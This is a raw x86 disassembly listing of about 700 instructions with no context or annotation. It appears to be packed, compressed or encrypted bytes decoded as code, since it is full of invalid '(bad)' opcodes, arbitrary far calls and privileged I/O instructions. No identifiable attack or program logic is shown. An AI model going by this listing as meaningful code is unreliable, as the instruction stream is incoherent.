  40fa5f:	call   0x1560:0x23868f18
  40fa66:	ret    0x4f3f
  40fa69:	xchg   edi,eax
  40fa6a:	inc    edi
  40fa6b:	or     al,0xbb
  40fa6d:	sbb    ebp,DWORD PTR [edi+0x28982e08]
  40fa73:	pusha  
  40fa74:	ds (bad) 
  40fa76:	jg     0x40fa5a
  40fa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa79:	adc    BYTE PTR fs:[ebp-0x75],ch
  40fa7d:	dec    esp
  40fa7e:	aad    0x47
  40fa80:	lahf   
  40fa81:	mov    ebx,0xf2071522
  40fa86:	jg     0x40fa1c
  40fa88:	stos   DWORD PTR es:[edi],eax
  40fa89:	cs cs cli 
  40fa8c:	and    al,0x5f
  40fa8e:	mov    ds:0x144c8d03,al
  40fa93:	mov    dl,0xef
  40fa95:	push   esi
  40fa96:	jl     0x40fa7d
  40fa98:	popa   
  40fa99:	loope  0x40fa78
  40fa9b:	lea    esp,[eax-0x4e]
  40fa9e:	aas    
  40fa9f:	(bad)  
  40faa0:	retf   0x4055
  40faa3:	repnz xor DWORD PTR [eax+eax*2],eax
  40faa7:	cs xor al,0xf9
  40faaa:	xor    edi,eax
  40faac:	dec    edx
  40faad:	repnz sbb bh,BYTE PTR [eax]
  40fab0:	test   edx,edx
  40fab2:	loop   0x40fabf
  40fab4:	sbb    DWORD PTR [ebx-0x2583fe12],edx
  40faba:	xor    esi,DWORD PTR [eax]
  40fabc:	inc    esi
  40fabd:	aas    
  40fabe:	pop    eax
  40fabf:	xor    al,0x11
  40fac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fac2:	or     ax,0xa00b
  40fac6:	scas   eax,DWORD PTR es:[edi]
  40fac7:	cmp    DWORD PTR ds:0xecfe1b47,0xffffffe8
  40face:	mov    edi,0x8ca7a5cd
  40fad3:	mov    ebp,esi
  40fad5:	and    edi,DWORD PTR [ebx+0x42]
  40fad8:	imul   ebx,DWORD PTR [ebx-0x22b3e21],0x26df1759
  40fae2:	mov    bl,0xdb
  40fae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae5:	ror    BYTE PTR [esi],0xa9
  40fae8:	cmp    esp,DWORD PTR [ebp-0x22]
  40faeb:	test   BYTE PTR [ebx],cl
  40faed:	outs   dx,BYTE PTR ds:[esi]
  40faee:	in     eax,0xe
  40faf0:	enter  0x844b,0x2b
  40faf4:	out    0xd9,al
  40faf6:	(bad)  
  40faf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf8:	out    0x4c,al
  40fafa:	cdq    
  40fafb:	xchg   edi,eax
  40fafc:	xor    DWORD PTR [eax-0x43],edi
  40faff:	xlat   BYTE PTR ds:[ebx]
  40fb00:	mov    ss,esp
  40fb02:	pop    edx
  40fb03:	sub    dh,BYTE PTR [ebx]
  40fb05:	dec    edx
  40fb06:	cmp    eax,0x22268464
  40fb0b:	push   cs
  40fb0c:	xchg   DWORD PTR [eax],ecx
  40fb0e:	call   0x3ca5:0xe256b111
  40fb15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb16:	int3   
  40fb17:	xor    al,0xa6
  40fb19:	adc    BYTE PTR [edx+0x1b],ah
  40fb1c:	scas   eax,DWORD PTR es:[edi]
  40fb1d:	or     edx,DWORD PTR [eax]
  40fb1f:	mov    eax,ds:0x60ff2a07
  40fb24:	test   cl,0x8b
  40fb27:	jg     0x40fb17
  40fb29:	adc    al,0xbd
  40fb2b:	mov    ds:0x2c219b2c,eax
  40fb30:	lahf   
  40fb31:	inc    ecx
  40fb32:	inc    ebx
  40fb33:	adc    al,0x4d
  40fb35:	cmp    bl,dh
  40fb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb38:	and    bh,bh
  40fb3a:	dec    ebp
  40fb3b:	imul   ebx,DWORD PTR [edi*2-0x1a39fa6],0x38984b02
  40fb46:	clc    
  40fb47:	jmp    0x1980beb4
  40fb4c:	mov    ah,0xde
  40fb4e:	addr16 aaa 
  40fb50:	xchg   esi,eax
  40fb51:	push   es
  40fb52:	inc    esi
  40fb53:	fs xchg edi,esp
  40fb56:	out    dx,eax
  40fb57:	fmul   DWORD PTR [edx+0x52]
  40fb5a:	jp     0x40fb7b
  40fb5c:	(bad)
  40fb60:	sub    esi,DWORD PTR [ebx+ebp*4+0x2e100167]
  40fb67:	xor    BYTE PTR [ecx+0x72],ch
  40fb6a:	sbb    eax,0xe2c6dc27
  40fb6f:	xchg   edi,eax
  40fb70:	sub    BYTE PTR [esi-0x4c8f962a],dl
  40fb76:	mov    ah,0x8f
  40fb78:	inc    ebp
  40fb79:	icebp  
  40fb7a:	mov    cl,0x22
  40fb7c:	retf   0x1094
  40fb7f:	outs   dx,BYTE PTR ds:[esi]
  40fb80:	pop    ebx
  40fb81:	adc    al,0x38
  40fb83:	pop    ebx
  40fb84:	call   0x8088:0x100679bc
  40fb8b:	mov    esi,0x4be1baca
  40fb90:	mov    bl,0x8f
  40fb92:	nop
  40fb93:	add    BYTE PTR [ebx],dl
  40fb95:	push   edi
  40fb96:	aas    
  40fb97:	dec    ebp
  40fb98:	pop    eax
  40fb99:	loopne 0x40fb9e
  40fb9b:	xchg   ebx,eax
  40fb9c:	push   ds
  40fb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb9e:	dec    esi
  40fb9f:	retf   0xac2f
  40fba2:	pop    edx
  40fba3:	or     bl,al
  40fba5:	lods   eax,DWORD PTR ds:[esi]
  40fba6:	and    eax,0x6bfbae72
  40fbab:	lods   eax,DWORD PTR ds:[esi]
  40fbac:	adc    BYTE PTR [ebx],dh
  40fbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbaf:	jmp    0x350bbca
  40fbb4:	cli    
  40fbb5:	add    al,0x64
  40fbb7:	stc    
  40fbb8:	cmp    al,0x4f
  40fbba:	mov    edx,0xf63f3f16
  40fbbf:	pop    esi
  40fbc0:	pop    DWORD PTR [esi+edi*1-0x3a6bc10]
  40fbc7:	mov    edx,0xbb81fe46
  40fbcc:	(bad)  [ecx]
  40fbce:	add    eax,0x33da0f46
  40fbd3:	or     DWORD PTR [ebx+0xe98f0b3],ebx
  40fbd9:	push   edx
  40fbda:	pop    eax
  40fbdb:	push   edi
  40fbdc:	push   ds
  40fbdd:	dec    edx
  40fbde:	pop    ss
  40fbdf:	imul   edi,eax,0xffffffa8
  40fbe2:	cdq    
  40fbe3:	aas    
  40fbe4:	imul   edi,DWORD PTR ds:0xdc26982d,0x3
  40fbeb:	sti    
  40fbec:	ror    BYTE PTR [eax+0x9fcb991],cl
  40fbf2:	push   ds
  40fbf3:	stos   BYTE PTR es:[edi],al
  40fbf4:	or     eax,0x1dd83138
  40fbf9:	jo     0x40fb87
  40fbfb:	dec    esi
  40fbfc:	mov    ah,0xc3
  40fbfe:	test   BYTE PTR [edi+ebx*1+0x474a20c6],al
  40fc05:	and    ebx,DWORD PTR [esi-0x5da69f1f]
  40fc0b:	stc    
  40fc0c:	add    BYTE PTR [esi+ecx*1-0x6be28464],bh
  40fc13:	xor    BYTE PTR [ecx+ebp*8+0x61232d7],ch
  40fc1a:	repnz dec edi
  40fc1c:	adc    BYTE PTR [esi+edi*8+0x2c611d49],dh
  40fc23:	daa    
  40fc24:	stos   BYTE PTR es:[edi],al
  40fc25:	inc    ebp
  40fc26:	call   0xf144:0x5c270207
  40fc2d:	xchg   ebp,eax
  40fc2e:	and    DWORD PTR [ecx+0x45],edi
  40fc31:	add    bh,BYTE PTR [ecx-0x59]
  40fc34:	jne    0x40fca5
  40fc36:	in     al,dx
  40fc37:	xchg   edi,eax
  40fc38:	push   edi
  40fc39:	xchg   ebx,eax
  40fc3a:	mov    eax,ds:0xff0a28e5
  40fc3f:	xor    DWORD PTR [eax+0x5d2f7f30],0xffffffb6
  40fc46:	or     dh,BYTE PTR [ecx+ecx*4+0x47]
  40fc4a:	sbb    DWORD PTR [ecx],esi
  40fc4c:	xchg   BYTE PTR ds:0x404f70f8,ah
  40fc52:	mov    al,ds:0xf6ebb2da
  40fc57:	aaa    
  40fc58:	push   edi
  40fc59:	pusha  
  40fc5a:	add    DWORD PTR [ecx],eax
  40fc5c:	cs and ch,ch
  40fc5f:	fsub   DWORD PTR [edx]
  40fc61:	and    BYTE PTR [esi],dh
  40fc63:	in     eax,dx
  40fc64:	cmp    eax,0xb6af4c9d
  40fc69:	pop    edi
  40fc6a:	(bad)  
  40fc6b:	and    eax,0x1d3266b5
  40fc70:	mov    cl,0xe7
  40fc72:	xor    bh,BYTE PTR [esi+esi*4+0x622b2323]
  40fc79:	in     eax,0x49
  40fc7b:	je     0x40fcc2
  40fc7d:	test   DWORD PTR [ecx+0xd0fcd9d],edi
  40fc83:	xor    BYTE PTR ds:0xa3fc11ac,ah
  40fc89:	push   0xbeacb63d
  40fc8e:	aas    
  40fc8f:	ins    BYTE PTR es:[edi],dx
  40fc90:	je     0x40fd0e
  40fc92:	imul   eax,DWORD PTR [esi],0xb440989a
  40fc98:	lods   al,BYTE PTR ds:[esi]
  40fc99:	jle    0x40fcd0
  40fc9b:	cmp    BYTE PTR [edi-0x5d],bh
  40fc9e:	mov    al,ds:0xe018a821
  40fca3:	xchg   ebx,eax
  40fca4:	push   0x77a7fd61
  40fca9:	jecxz  0x40fd12
  40fcab:	add    al,0x79
  40fcad:	fsubr  st(5),st
  40fcaf:	mov    ebp,0xcda64307
  40fcb4:	sub    esi,DWORD PTR [esi]
  40fcb6:	pushf  
  40fcb7:	sbb    ebp,DWORD PTR [edi+0x47f2ecc]
  40fcbd:	sbb    DWORD PTR [esp+ecx*4+0x17],ecx
  40fcc1:	outs   dx,BYTE PTR ds:[esi]
  40fcc2:	sub    bh,dl
  40fcc4:	rol    BYTE PTR [eax],cl
  40fcc6:	inc    ebx
  40fcc7:	cld    
  40fcc8:	out    dx,eax
  40fcc9:	mov    dh,0xd
  40fccb:	or     eax,0xe080f927
  40fcd0:	dec    ebx
  40fcd1:	outs   dx,BYTE PTR ds:[esi]
  40fcd2:	ficomp WORD PTR cs:[ebx]
  40fcd5:	aaa    
  40fcd6:	xchg   edi,eax
  40fcd7:	adc    eax,0xb4933238
  40fcdc:	or     BYTE PTR [eax-0x6b],bl
  40fcdf:	in     al,0xe9
  40fce1:	sbb    BYTE PTR [ebx+eax*2],bh
  40fce4:	test   DWORD PTR [ebx+0x5ef7ea39],eax
  40fcea:	xor    esp,DWORD PTR [ecx]
  40fcec:	pushf  
  40fced:	sbb    BYTE PTR [edx+ebx*2-0x3730cad9],ah
  40fcf4:	mov    esp,0x25e07925
  40fcf9:	mov    bl,0x67
  40fcfb:	jo     0x40fd15
  40fcfd:	lods   al,BYTE PTR ds:[esi]
  40fcfe:	call   0x5c8b:0xde73914a
  40fd05:	dec    edx
  40fd06:	mov    bh,0xeb
  40fd08:	add    eax,0x6c44a538
  40fd0d:	bound  edx,QWORD PTR [esi]
  40fd0f:	push   ecx
  40fd10:	mov    bl,0xb
  40fd12:	jb     0x40fd15
  40fd14:	adc    DWORD PTR [edi],0x24aee01b
  40fd1a:	inc    eax
  40fd1b:	lods   eax,DWORD PTR ds:[esi]
  40fd1c:	dec    esp
  40fd1d:	push   esi
  40fd1e:	int    0x6
  40fd20:	dec    ebx
  40fd21:	xlat   BYTE PTR ds:[ebx]
  40fd22:	test   esi,edi
  40fd24:	mov    dl,BYTE PTR [edi+0x1660aa5d]
  40fd2a:	not    BYTE PTR [esp+esi*2]
  40fd2d:	stc    
  40fd2e:	shr    DWORD PTR [ebx-0x19],cl
  40fd31:	inc    ebp
  40fd32:	shl    dl,0x4
  40fd35:	bound  ecx,QWORD PTR ds:0x3aecda1d
  40fd3b:	fcom   QWORD PTR [edi-0x6e08566b]
  40fd41:	mov    cl,0xdf
  40fd43:	sbb    BYTE PTR [edx],dh
  40fd45:	ins    BYTE PTR es:[edi],dx
  40fd46:	mov    dl,0x8b
  40fd48:	clc    
  40fd49:	xchg   ebx,eax
  40fd4a:	sub    eax,0xa4872ed0
  40fd4f:	lods   al,BYTE PTR gs:[esi]
  40fd51:	cs mov edi,0xad50057b
  40fd57:	and    bl,BYTE PTR [eax-0x4245ae22]
  40fd5d:	sub    eax,0x68907e56
  40fd62:	sub    edi,eax
  40fd64:	loop   0x40fd8a
  40fd66:	js     0x40fd3d
  40fd68:	mov    esp,DWORD PTR cs:[edx+edi*1-0x4741c931]
  40fd70:	repz aam 0x5d
  40fd73:	(bad)  
  40fd74:	jl     0x40fda0
  40fd76:	fwait
  40fd77:	and    al,0xb0
  40fd79:	inc    edx
  40fd7a:	and    BYTE PTR [esi+0x292d9c],dh
  40fd80:	adc    ebp,DWORD PTR [esi+ecx*2]
  40fd83:	call   0x14fec9a6
  40fd88:	cmp    eax,0x797641d5
  40fd8d:	jle    0x40fd2e
  40fd8f:	jb     0x40fdb5
  40fd91:	jmp    0x6e7e:0x2fa438b0
  40fd98:	and    al,0x18
  40fd9a:	mov    eax,0x8fc0594b
  40fd9f:	xchg   ebx,eax
  40fda0:	sub    bl,ch
  40fda2:	retf   0x162e
  40fda5:	adc    al,0x74
  40fda7:	add    cl,bh
  40fda9:	jbe    0x40fd6e
  40fdab:	jl     0x40fd90
  40fdad:	jg     0x40fdd5
  40fdaf:	xchg   ebx,eax
  40fdb0:	es cwde 
  40fdb2:	inc    esi
  40fdb3:	retf   0xf06c
  40fdb6:	pop    eax
  40fdb7:	outs   dx,DWORD PTR ds:[esi]
  40fdb8:	inc    ebp
  40fdb9:	jbe    0x40fd8b
  40fdbb:	(bad)  
  40fdbd:	fldcw  WORD PTR [ebx-0x2b]
  40fdc0:	xor    ecx,DWORD PTR [ebp-0x37ba66fb]
  40fdc6:	int    0x64
  40fdc8:	out    0x21,al
  40fdca:	jno    0x40fdaf
  40fdcc:	shl    ah,0x4a
  40fdcf:	cli    
  40fdd0:	(bad)  
  40fdd1:	out    0xf6,al
  40fdd3:	cmp    ah,BYTE PTR [eax]
  40fdd5:	arpl   WORD PTR [ebp+0x2593b8f3],di
  40fddb:	stc    
  40fddc:	pushf  
  40fddd:	mov    ebx,0xee251be1
  40fde2:	dec    ebp
  40fde3:	push   esp
  40fde4:	call   0xffb8:0x2ce81b81
  40fdeb:	jae    0x40fe50
  40fded:	dec    edx
  40fdee:	loopne 0x40fdc0
  40fdf0:	sub    BYTE PTR [ebp-0x3c286677],dl
  40fdf6:	or     al,0x87
  40fdf8:	or     DWORD PTR [edx+0x33],ecx
  40fdfb:	clc    
  40fdfc:	push   edx
  40fdfd:	int    0xfd
  40fdff:	rcr    DWORD PTR [eax],1
  40fe01:	ja     0x40fe2a
  40fe03:	aaa    
  40fe04:	mov    eax,ds:0x5ec9cd2
  40fe09:	pop    edi
  40fe0a:	push   eax
  40fe0b:	clc    
  40fe0c:	cmp    BYTE PTR [ebx-0x34],dl
  40fe0f:	pop    esp
  40fe10:	add    ebx,ebx
  40fe12:	adc    esp,DWORD PTR [eax+0x1e]
  40fe15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe16:	jle    0x40fe67
  40fe18:	inc    ecx
  40fe19:	xchg   edi,eax
  40fe1a:	es sub ebp,ebp
  40fe1d:	aas    
  40fe1e:	mov    esp,0x528bb517
  40fe23:	cli    
  40fe24:	xor    DWORD PTR [edi+edx*2],edx
  40fe27:	dec    edi
  40fe28:	xchg   ebx,eax
  40fe29:	jo     0x40fdfb
  40fe2b:	fwait
  40fe2c:	dec    edi
  40fe2d:	adc    bh,BYTE PTR [eax]
  40fe2f:	pop    ebx
  40fe30:	retf   0xef8c
  40fe33:	mov    esp,ds
  40fe35:	or     DWORD PTR [bp+si],ebx
  40fe38:	imul   edi,DWORD PTR [ecx+ebp*4],0x21edbd63
  40fe3f:	push   edi
  40fe40:	mov    DWORD PTR [edi-0x32ae2855],esi
  40fe46:	imul   ebx,DWORD PTR [ebx+0x42],0x65
  40fe4a:	or     al,0xb2
  40fe4c:	mov    cs,WORD PTR [ecx-0x60]
  40fe4f:	fcmovnbe st,st(1)
  40fe51:	pop    ss
  40fe52:	xor    ebp,ebp
  40fe54:	hlt    
  40fe55:	xchg   esi,ecx
  40fe57:	cmc    
  40fe58:	mov    ecx,0x968e2010
  40fe5d:	enter  0x268f,0x48
  40fe61:	loope  0x40fe26
  40fe63:	mov    esi,0x546697cc
  40fe68:	daa    
  40fe69:	lods   al,BYTE PTR ds:[esi]
  40fe6a:	inc    edi
  40fe6b:	iret   
  40fe6c:	jo     0x40fe20
  40fe6e:	in     eax,0x16
  40fe70:	or     eax,0x32dafa80
  40fe75:	inc    ecx
  40fe76:	sbb    eax,0x89890777
  40fe7b:	loop   0x40fecd
  40fe7d:	jb     0x40fe0b
  40fe7f:	adc    eax,0xcaa9e6a4
  40fe84:	jb     0x40fe91
  40fe86:	sub    BYTE PTR [eax],0x4d
  40fe89:	repz enter 0x990d,0x6
  40fe8e:	lds    ebx,FWORD PTR [edx-0x6d77674b]
  40fe94:	pop    ecx
  40fe95:	push   0x9c19e608
  40fe9a:	nop
  40fe9b:	repz jle 0x40fe55
  40fe9e:	aaa    
  40fe9f:	and    BYTE PTR [esi],cl
  40fea1:	mov    ah,0xcf
  40fea3:	out    dx,al
  40fea4:	adc    bl,cl
  40fea6:	and    al,0x32
  40fea8:	hlt    
  40fea9:	xchg   BYTE PTR [ebx-0x2df25a1f],dl
  40feaf:	retf   0x13a2
  40feb2:	add    DWORD PTR [edi],edx
  40feb4:	ins    BYTE PTR es:[edi],dx
  40feb5:	or     eax,0x6393ceb0
  40feba:	mov    esp,0xe1677f16
  40febf:	repnz iret 
  40fec1:	push   ecx
  40fec2:	scas   eax,DWORD PTR es:[edi]
  40fec3:	push   ecx
  40fec4:	pop    ss
  40fec5:	aaa    
  40fec6:	outs   dx,DWORD PTR ds:[esi]
  40fec7:	xchg   esi,eax
  40fec8:	sub    eax,0xa9121cf2
  40fecd:	adc    BYTE PTR [ecx-0x2d],bh
  40fed0:	add    DWORD PTR [eax+0x5bc064e4],ebx
  40fed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed7:	outs   dx,BYTE PTR ds:[esi]
  40fed8:	cld    
  40fed9:	ror    DWORD PTR [edi],cl
  40fedb:	jp     0x40fed9
  40fedd:	jl     0x40fef3
  40fedf:	xchg   esi,eax
  40fee0:	adc    eax,0xefea8b34
  40fee5:	je     0x40fece
  40fee7:	aad    0x0
  40fee9:	push   es
  40feea:	add    ebx,DWORD PTR [ecx+0x64]
  40feed:	mov    ebp,0x828960a2
  40fef2:	dec    esi
  40fef3:	cmp    esp,ebx
  40fef5:	xor    dh,BYTE PTR [esi+0x39]
  40fef8:	xchg   esi,eax
  40fef9:	push   es
  40fefa:	jl     0x40fee1
  40fefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fefd:	mov    eax,0x7edf97b6
  40ff02:	scas   al,BYTE PTR es:[edi]
  40ff03:	mov    DWORD PTR [edx-0x74e437fc],ecx
  40ff09:	pop    eax
  40ff0a:	js     0x40ff40
  40ff0c:	and    bl,BYTE PTR [edi+0x3]
  40ff0f:	je     0x40ff03
  40ff11:	jb     0x40ff68
  40ff13:	call   0x14e6a0d9
  40ff18:	lds    edi,FWORD PTR [edx]
  40ff1a:	ficomp DWORD PTR [edx-0x40]
  40ff1d:	arpl   WORD PTR [edx-0x4fc931e8],cx
  40ff23:	mov    edi,0x3304b37b
  40ff28:	push   0xffffff8a
  40ff2a:	(bad)  
  40ff2b:	pop    edi
  40ff2c:	lea    ebp,[edi+eax*4]
  40ff2f:	sub    al,0xdb
  40ff31:	dec    esi
  40ff32:	out    0xda,al
  40ff34:	push   ss
  40ff35:	outs   dx,BYTE PTR ds:[esi]
  40ff36:	(bad)  
  40ff37:	outs   dx,BYTE PTR ds:[esi]
  40ff38:	rcl    DWORD PTR [ecx+0x368b39cd],1
  40ff3e:	sub    BYTE PTR [ecx+0x65],cl
  40ff41:	int    0xe8
  40ff43:	sti    
  40ff44:	inc    ebp
  40ff45:	fisttp QWORD PTR [ebp+0x53]
  40ff48:	cdq    
  40ff49:	pushf  
  40ff4a:	(bad)  
  40ff4b:	jl     0x40ff3d
  40ff4d:	cmp    ebx,DWORD PTR [edi-0x2d]
  40ff50:	outs   dx,BYTE PTR ss:[esi]
  40ff52:	sub    DWORD PTR [ecx],eax
  40ff54:	enter  0x4ee2,0x11
  40ff58:	lds    esi,FWORD PTR [esi-0x4e]
  40ff5b:	jecxz  0x40ffc7
  40ff5d:	xchg   edi,eax
  40ff5e:	adc    dh,BYTE PTR [ecx]
  40ff60:	jge    0x40ff9b
  40ff62:	pop    esp
  40ff63:	adc    bl,dl
  40ff65:	cld    
  40ff66:	mov    al,ds:0x7f174c2b
  40ff6b:	fiadd  WORD PTR [edi-0x28]
  40ff6e:	mov    ecx,eax
  40ff70:	xchg   esi,eax
  40ff71:	and    al,0xa8
  40ff73:	fild   DWORD PTR [eax]
  40ff75:	ror    DWORD PTR [ecx],0x2b
  40ff78:	int3   
  40ff79:	out    dx,al
  40ff7a:	imul   DWORD PTR ds:0x6e7882c8
  40ff80:	stos   BYTE PTR es:[edi],al
  40ff81:	lods   al,BYTE PTR ds:[esi]
  40ff82:	test   ebx,esi
  40ff84:	ins    DWORD PTR es:[edi],dx
  40ff85:	jbe    0x40ff6e
  40ff87:	mov    esp,0x2fa77f4f
  40ff8c:	fucomi st,st(1)
  40ff8e:	icebp  
  40ff8f:	cmp    eax,0x9c346307
  40ff94:	add    DWORD PTR [ebx+0x442bc6d5],esi
  40ff9a:	mov    dh,0x7f
  40ff9c:	loopne 0x40ff3e
  40ff9e:	imul   ebp,DWORD PTR [edi-0x1b174328],0xea716f75
  40ffa8:	(bad)  
  40ffa9:	loopne 0x40ff50
  40ffab:	scas   eax,DWORD PTR es:[edi]
  40ffac:	mov    ds:0xdf356bbf,al
  40ffb1:	lds    eax,FWORD PTR [eax-0xd7601a3]
  40ffb7:	in     eax,0x6f
  40ffb9:	sbb    cl,BYTE PTR [edx]
  40ffbb:	mov    edx,0xbdf53095
  40ffc0:	add    al,0x8b
  40ffc2:	ss mov dl,0xd0
  40ffc5:	jle    0x40ff58
  40ffc7:	xor    BYTE PTR [ebp-0x70],0xaa
  40ffcb:	push   0xffffff86
  40ffcd:	jo     0x41001f
  40ffcf:	xchg   ebp,eax
  40ffd0:	inc    edx
  40ffd1:	xor    ecx,eax
  40ffd3:	sahf   
  40ffd4:	inc    eax
  40ffd5:	mov    esp,0xdbd0d403
  40ffda:	hlt    
  40ffdb:	fcmovb st,st(7)
  40ffdd:	jecxz  0x40ffea
  40ffdf:	pop    esp
  40ffe0:	or     esp,DWORD PTR [ecx+ebx*4-0x3b]
  40ffe4:	or     al,0x6f
  40ffe6:	sar    DWORD PTR [ebx+0x7dfc3233],1
  40ffec:	lods   al,BYTE PTR ds:[esi]
  40ffed:	add    ebx,ebx
  40ffef:	dec    esi
  40fff0:	sbb    BYTE PTR [edi+edx*4],0x90
  40fff4:	or     eax,DWORD PTR [edx+edx*8-0xf368691]
  40fffb:	loope  0x40fff0
  40fffd:	jmp    0xd46b5548
  410002:	into   
  410003:	jge    0x40ffd6
  410005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410006:	sar    DWORD PTR [edx-0x7c],1
  410009:	gs (bad) 
  41000b:	loop   0x40ffae
  41000d:	xchg   ebx,eax
  41000e:	add    eax,0x1e8cd739
  410013:	or     bl,al
  410015:	pop    ds
  410016:	sub    al,0x50
  410018:	sub    ebx,esp
  41001a:	adc    BYTE PTR [edx],0x93
  41001d:	sub    al,0x8f
  41001f:	(bad)  
  410020:	ror    ebp,1
  410022:	popf   
  410023:	bound  ebp,QWORD PTR [ebx+0xc90dda7]
  410029:	data16 jno 0x40ffeb
  41002c:	rcr    BYTE PTR es:[ebx],0x48
  410030:	in     eax,dx
  410031:	lahf   
  410032:	jno    0x4100a1
  410034:	sti    
  410035:	cli    
  410036:	arpl   WORD PTR [ecx],di
  410038:	out    0x5e,eax
  41003a:	cmp    BYTE PTR [edi+ecx*1],ch
  41003d:	ins    DWORD PTR es:[edi],dx
  41003e:	inc    ebx
  41003f:	cmp    BYTE PTR [esi-0x39],ch
  410042:	stos   BYTE PTR es:[edi],al
  410043:	jl     0x410008
  410045:	icebp  
  410046:	and    ecx,DWORD PTR [esi]
  410048:	add    esp,esp
  41004a:	inc    eax
  41004b:	les    edi,FWORD PTR [eax+0x3c]
  41004e:	call   0x20a3:0xc2b91e21
  410055:	lea    edi,[ecx-0x42]
  410058:	jmp    0x4e45:0x39533d08
  41005f:	mov    ebp,0x2bc9cb1
  410064:	aad    0x90
  410066:	(bad)  
  410068:	and    al,BYTE PTR [ebx+0x3e]
  41006b:	or     al,0x8a
  41006d:	mov    cl,0x59
  41006f:	or     ecx,edx
  410071:	jmp    ebx
  410073:	xchg   DWORD PTR [ebx-0xf3e7cc8],ebx
  410079:	mov    ds:0x7870c0b3,al
  41007e:	mov    cl,0x4a
  410080:	stos   DWORD PTR es:[edi],eax
  410081:	adc    esp,DWORD PTR [esi]
  410083:	cmp    al,0x6e
  410085:	in     eax,dx
  410086:	xchg   ecx,eax
  410087:	test   dh,dl
  410089:	or     esi,DWORD PTR [ebp-0x29]
  41008c:	inc    ecx
  41008d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41008e:	mov    edx,esp
  410090:	add    BYTE PTR [edi+0x19],0x64
  410094:	xchg   esp,eax
  410095:	mov    ebp,0x4c8c9a7b
  41009a:	call   0x40babe36
  41009f:	add    ch,BYTE PTR [ecx+esi*8+0x5c79b8fb]
  4100a6:	add    eax,0x7b911c39
  4100ab:	inc    edi
  4100ac:	cli    
  4100ad:	mov    bh,0xc2
  4100af:	mov    esi,0x5bb3fb55
  4100b4:	mov    eax,0x31e2907f
  4100b9:	icebp  
  4100ba:	jp     0x41008a
  4100bc:	sbb    al,0xbf
  4100be:	loop   0x4100af
  4100c0:	(bad)  
  4100c1:	in     al,0x39
  4100c3:	popf   
  4100c4:	sub    DWORD PTR ds:0x981d17a,ebx
  4100ca:	sbb    edi,DWORD PTR [edx]
  4100cc:	in     al,0x21
  4100ce:	(bad)  
  4100cf:	retf   
  4100d0:	daa    
  4100d1:	add    cl,BYTE PTR [edx]
  4100d3:	xor    al,0xb6
  4100d5:	scas   al,BYTE PTR es:[edi]
  4100d6:	add    al,0xaf
  4100d8:	nop
  4100d9:	dec    ecx
  4100da:	push   ds
  4100db:	(bad)  
  4100dc:	pop    ds
  4100dd:	mov    ch,0xdf
  4100df:	mov    dh,ah
  4100e1:	dec    ecx
  4100e2:	cmp    al,0x83
  4100e4:	cs push eax
  4100e6:	aas    
  4100e7:	or     ecx,DWORD PTR [edi+0x5b498d06]
  4100ed:	and    cl,dl
  4100ef:	sub    ecx,esi
  4100f1:	repz div bh
  4100f4:	leave  
  4100f5:	sub    BYTE PTR [eax],ch
  4100f7:	scas   al,BYTE PTR es:[edi]
  4100f8:	sbb    eax,0xdfda4fff
  4100fd:	fsubp  st(0),st
  4100ff:	xor    eax,0x303d0d00
  410104:	(bad)  
  410105:	pop    eax
  410106:	pop    sp
  410108:	xor    al,0x9f
  41010a:	out    0x44,eax
  41010c:	fsubr  st,st(1)
  41010e:	adc    al,0xc9
  410110:	popa   
  410111:	fnstsw WORD PTR [edx-0x75]
  410114:	dec    eax
  410115:	iret   
  410116:	daa    
  410117:	mov    al,ah
  410119:	sub    BYTE PTR [edi-0x6f],bh
  41011c:	mov    edi,0x20f8bd60
  410121:	pop    eax
  410122:	daa    
  410123:	and    eax,0x79e41174
  410128:	xor    ebx,esi
  41012a:	pop    ebp
  41012b:	pop    ecx
  41012c:	mov    fs,WORD PTR [edx-0x3]
  41012f:	cmp    al,0x31
  410131:	aaa    
  410132:	inc    edi
  410133:	mov    bl,0xb9
  410135:	inc    ecx
  410136:	and    eax,0x27ed3cb0
  41013b:	sub    bl,ch
  41013d:	sbb    al,0x6b
  41013f:	and    al,0x8d
  410141:	aam    0xe7
  410143:	pop    ss
  410144:	adc    BYTE PTR ds:0xeff2e7a8,cl
  41014a:	je     0x4100e9
  41014c:	add    ebx,DWORD PTR [ecx+0x1a0e889f]
  410152:	mov    cl,0x60
  410154:	mov    ebx,0x8567522e
  410159:	mov    al,ds:0x7bc5e7df
  41015e:	cmp    esi,edx
  410160:	lock push edi
  410162:	pop    esp
  410163:	enter  0x6ba9,0x1b
  410167:	hlt    
  410168:	or     esp,edx
  41016a:	icebp  
  41016b:	daa    
  41016c:	xor    ebx,eax
  41016e:	aam    0xe4
  410170:	adc    BYTE PTR [esi],ch
  410172:	rcr    DWORD PTR [esi],1
  410174:	fidivr WORD PTR [ebp+0x7ba593f3]
  41017a:	cmc    
  41017b:	fist   DWORD PTR [ebx-0x1b3ea44c]
  410181:	push   ds
  410182:	out    dx,al
  410183:	xchg   BYTE PTR [ebp+0x57],bh
  410186:	fsubrp st(4),st
  410188:	xor    eax,0xa5e3605f
  41018d:	pop    es
  41018e:	(bad)  
  41018f:	loope  0x4101c5
  410191:	mov    bh,BYTE PTR ss:[esi+0x730a5cf8]
  410198:	das    
  410199:	(bad)  
  41019a:	clc    
  41019b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019c:	jp     0x41016f
  41019e:	stc    
  41019f:	mov    ecx,0xcbc9e72c
  4101a4:	ja     0x410221
  4101a6:	dec    ebp
  4101a7:	(bad)  
  4101a8:	mov    ds:0xe53c30a2,al
  4101ad:	mov    edx,0x7c761bdb
  4101b2:	adc    dh,BYTE PTR [edx-0x4af837cd]
  4101b8:	sub    ah,dh
